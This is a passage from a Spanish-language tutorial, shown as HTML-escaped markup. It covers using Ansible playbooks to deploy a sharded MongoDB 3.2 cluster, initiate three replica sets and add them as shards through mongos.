&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Los config servers&lt;/h2&gt;
&lt;p&gt;Los &lt;em&gt;config servers&lt;/em&gt; son procesos &lt;strong&gt;mongod&lt;/strong&gt; con una configuración concreta. El &lt;strong&gt;playbook&lt;/strong&gt; se limita a crear una estructura en &lt;em&gt;/opt/mongodb/&lt;/em&gt; asegurándose que hay el binario &lt;strong&gt;mongod&lt;/strong&gt;, la configuración, la carpeta de datos y la &lt;em&gt;unit&lt;/em&gt; de &lt;strong&gt;systemd&lt;/strong&gt; activa.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook config_servers.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Un acceso al cluster&lt;/h2&gt;
&lt;p&gt;Para poder configurar el &lt;em&gt;cluster&lt;/em&gt; y para un uso futuro, hemos decidido poner un proceso &lt;strong&gt;mongos&lt;/strong&gt; y el binario &lt;strong&gt;mongo&lt;/strong&gt; para poder acceder al &lt;em&gt;mongo shell&lt;/em&gt;. Se ha optado por separar los &lt;strong&gt;playbooks&lt;/strong&gt;; así se podrá utilizar para desplegarlos por separado en futuras máquinas que los puedan usar.&lt;/p&gt;
&lt;p&gt;De hecho, la recomendación oficial es poner un &lt;strong&gt;mongos&lt;/strong&gt; en cada &lt;em&gt;backend&lt;/em&gt;, aunque no necesitan el binario &lt;strong&gt;mongo&lt;/strong&gt; porque disponen de los &lt;em&gt;drivers&lt;/em&gt; oficiales del lenguaje que utilicen.&lt;/p&gt;
&lt;p&gt;Empezaremos desplegando los procesos &lt;strong&gt;mongos&lt;/strong&gt; en donde toque (de momento solo en el servidor &lt;em&gt;mongo01&lt;/em&gt;). Este &lt;strong&gt;playbook&lt;/strong&gt; se limita a poner el binario &lt;strong&gt;mongos&lt;/strong&gt; y su respectiva &lt;em&gt;unit&lt;/em&gt; para &lt;strong&gt;systemd&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook mongos_servers.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para nuestra comodidad, también vamos a desplegar el &lt;em&gt;mongo shell&lt;/em&gt;. Este &lt;strong&gt;playbook&lt;/strong&gt; se limita a poner el binario &lt;strong&gt;mongo&lt;/strong&gt; en su sitio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook clients.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Los procesos de los shards&lt;/h2&gt;
&lt;p&gt;Tenemos 9 procesos de este tipo, así que los &lt;strong&gt;roles&lt;/strong&gt; de &lt;strong&gt;ansible&lt;/strong&gt; tienen un protagonismo especial. Los cambios entre los procesos son mínimos, y se pasan por parámetro para que el rol cree los ficheros necesarios a partir de una plantilla. El rol se encarga solamente de poner el binario &lt;strong&gt;mongod&lt;/strong&gt; en &lt;em&gt;/opt/mongodb/bin&lt;/em&gt;, crear la carpeta de datos y configurar el servicio como una &lt;em&gt;unit&lt;/em&gt; de &lt;strong&gt;systemd&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Se ha decidido separar los &lt;em&gt;shards&lt;/em&gt; en diferentes &lt;strong&gt;playbooks&lt;/strong&gt; para simplificar la creación de futuros nuevos &lt;em&gt;shards&lt;/em&gt;; así pues, lanzamos el &lt;strong&gt;playbook&lt;/strong&gt; para el primer &lt;em&gt;shard&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook aquila_shard.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acto seguido, lanzamos el &lt;strong&gt;playbook&lt;/strong&gt; responsable de montar los procesos del segundo &lt;em&gt;shard&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook lyra_shard.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente, lanzamos el tercer &lt;strong&gt;playbook&lt;/strong&gt; para desplegar los procesos del último &lt;em&gt;shard&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook cygnus_shard.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Atando los replica sets&lt;/h2&gt;
&lt;p&gt;El paso anterior nos ha dejado todos los procesos en funcionamiento, pero no hemos iniciado los &lt;em&gt;replica sets&lt;/em&gt;. Para que funcionen como tal, tenemos que configurarlos uno por uno como ya sabemos hacer, usando &lt;em&gt;rs.status()&lt;/em&gt; para verificar que ha quedado todo como debe.&lt;/p&gt;
&lt;p&gt;Empezaremos con una máquina cualquiera del primer &lt;em&gt;shard&lt;/em&gt;; la configuración se propagará al resto sin nuestra intervención.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo01:~# /opt/mongodb/bin/mongo --host &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5 --port &lt;span class="m"&gt;27018&lt;/span&gt;
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.5
connecting to: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5:27018/test
...
&amp;gt; &lt;span class="nv"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
...     _id : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;,
...      members : &lt;span class="o"&gt;[&lt;/span&gt;
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;0&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo01:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;1&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo04:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;2&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo05:27020&amp;quot;&lt;/span&gt;, arbiterOnly: true&lt;span class="o"&gt;}&lt;/span&gt;,
...      &lt;span class="o"&gt;]&lt;/span&gt;
... &lt;span class="o"&gt;}&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;(&lt;/span&gt;config&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
aquila:OTHER&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
...
aquila:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
root@mongo01:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Seguimos con el segundo &lt;em&gt;shard&lt;/em&gt;, entrando en una de sus máquinas y lanzando el comando de configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo01:~# /opt/mongodb/bin/mongo --host &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6 --port &lt;span class="m"&gt;27018&lt;/span&gt;
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.5
connecting to: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6:27018/test
...
&amp;gt; &lt;span class="nv"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
...     _id : &lt;span class="s2"&gt;&amp;quot;lyra&amp;quot;&lt;/span&gt;,
...      members : &lt;span class="o"&gt;[&lt;/span&gt;
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;0&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo02:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;1&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo05:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;2&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo06:27020&amp;quot;&lt;/span&gt;, arbiterOnly: true&lt;span class="o"&gt;}&lt;/span&gt;,
...      &lt;span class="o"&gt;]&lt;/span&gt;
... &lt;span class="o"&gt;}&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;(&lt;/span&gt;config&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
lyra:OTHER&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
...
lyra:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
root@mongo01:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y montamos el tercer &lt;em&gt;shard&lt;/em&gt; desde una cualquiera de sus &lt;em&gt;replicas&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo01:~# /opt/mongodb/bin/mongo --host &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7 --port &lt;span class="m"&gt;27018&lt;/span&gt;
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.5
connecting to: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7:27018/test
...
&amp;gt; &lt;span class="nv"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
...     _id : &lt;span class="s2"&gt;&amp;quot;cygnus&amp;quot;&lt;/span&gt;,
...      members : &lt;span class="o"&gt;[&lt;/span&gt;
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;0&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo03:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;1&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo06:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;,
...          &lt;span class="o"&gt;{&lt;/span&gt;_id : &lt;span class="m"&gt;2&lt;/span&gt;, host : &lt;span class="s2"&gt;&amp;quot;mongo04:27020&amp;quot;&lt;/span&gt;, arbiterOnly: true&lt;span class="o"&gt;}&lt;/span&gt;,
...      &lt;span class="o"&gt;]&lt;/span&gt;
... &lt;span class="o"&gt;}&lt;/span&gt;
...
&amp;gt; rs.initiate&lt;span class="o"&gt;(&lt;/span&gt;config&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
cygnus:OTHER&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
...
cygnus:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
root@mongo01:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo los shards al cluster&lt;/h2&gt;
&lt;p&gt;Ahora tenemos un grupo de &lt;em&gt;config servers&lt;/em&gt;, que forman un &lt;em&gt;cluster&lt;/em&gt; de 0 &lt;em&gt;shards&lt;/em&gt; (válido pero inútil, ya que no tenemos donde guardar los datos). También disponemos de 3 &lt;em&gt;replica sets&lt;/em&gt; independientes, que se convertirán en los futuros &lt;em&gt;shards&lt;/em&gt;. Solo falta asociar los &lt;em&gt;shards&lt;/em&gt; al resto del &lt;em&gt;cluster&lt;/em&gt;, mediante el comando &lt;em&gt;sh.addShard()&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ello entramos en un &lt;strong&gt;mongos&lt;/strong&gt; desde donde lanzaremos los comandos. De hecho, solo tenemos uno, en &lt;em&gt;mongo01&lt;/em&gt;. Puesto que está en la misma máquina que el cliente &lt;strong&gt;mongo&lt;/strong&gt; y corre en el puerto estándar 27017, no hace falta especificar ni el &lt;em&gt;host&lt;/em&gt; ni el puerto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo01:~# /opt/mongodb/bin/mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.5
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
...
mongos&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veamos como está el cluster antes de añadir los &lt;em&gt;shards&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; printShardingStatus&lt;span class="o"&gt;()&lt;/span&gt;
--- Sharding Status ---
  sharding version: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;minCompatibleVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;5&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;currentVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;6&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;clusterId&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;571dd47adbda7a5a80047a5d&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
  shards:
  active mongoses:
        &lt;span class="s2"&gt;&amp;quot;3.2.5&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
  balancer:
        Currently enabled:  yes
        Currently running:  no
        Failed balancer rounds in last &lt;span class="m"&gt;5&lt;/span&gt; attempts:  &lt;span class="m"&gt;0&lt;/span&gt;
        Migration Results &lt;span class="k"&gt;for&lt;/span&gt; the last &lt;span class="m"&gt;24&lt;/span&gt; hours:
                No recent migrations
  databases:

mongos&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Procedemos a lanzar el comando para añadir cada &lt;em&gt;shard&lt;/em&gt;. Es interesante saber que el proceso &lt;strong&gt;mongos&lt;/strong&gt; puede reconocer la forma de cada &lt;em&gt;replica set&lt;/em&gt; a partir de cualquiera de sus procesos. Podemos dar la URL con una sola máquina, o con varias de ellas. Lo importante es que alguna de ellas esté levantada, para que el proceso &lt;strong&gt;mongos&lt;/strong&gt; pueda descubrir el resto a partir de su configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;aquila/mongo01:27018&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lyra/mongo02:27018,mongo05:27018,mongo06:27020&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
